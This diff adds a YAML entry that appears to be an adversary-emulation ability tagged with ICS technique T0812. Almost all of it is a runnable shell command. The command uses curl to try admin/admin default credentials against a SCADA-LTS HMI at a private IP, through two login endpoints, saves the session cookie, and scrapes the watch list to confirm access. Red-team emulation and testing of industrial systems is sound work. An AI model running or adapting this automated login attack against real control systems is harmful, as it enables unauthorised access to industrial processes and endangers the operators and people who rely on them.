@@ -1,0 +1,14 @@
+---
+
+- id: c3d4e5f6-3333-3333-3333-000000000001
+  name: SCADA-LTS - Default Credential Login
+  description: |
+    Spring Security first, then login.htm. Session /tmp/hmi_cookies.txt. Validates with watch_list.shtm.
+  tactic: lateral-movement
+  technique_id: T0812
+  technique_name: Default Credentials
+  executors:
+  - platform: linux
+    name: sh
+    command: rm -f /tmp/hmi_cookies.txt && curl -s -c /tmp/hmi_cookies.txt -L -d "j_username=admin&j_password=admin" "http://192.168.90.107:8080/j_spring_security_check" -o /dev/null && curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/watch_list.shtm" -o /tmp/hmi_watch.html && ( grep -qiE "Scada|Watch|point|Data" /tmp/hmi_watch.html && echo "HMI_LOGIN_SUCCESS" ) || ( rm -f /tmp/hmi_cookies.txt && curl -s -c /tmp/hmi_cookies.txt -L -d "username=admin&password=admin" "http://192.168.90.107:8080/login.htm" -o /dev/null && curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/watch_list.shtm" -o /tmp/hmi_watch2.html && ( grep -qiE "Scada|Watch|point|Data" /tmp/hmi_watch2.html && echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED" ) )
+    timeout: 60
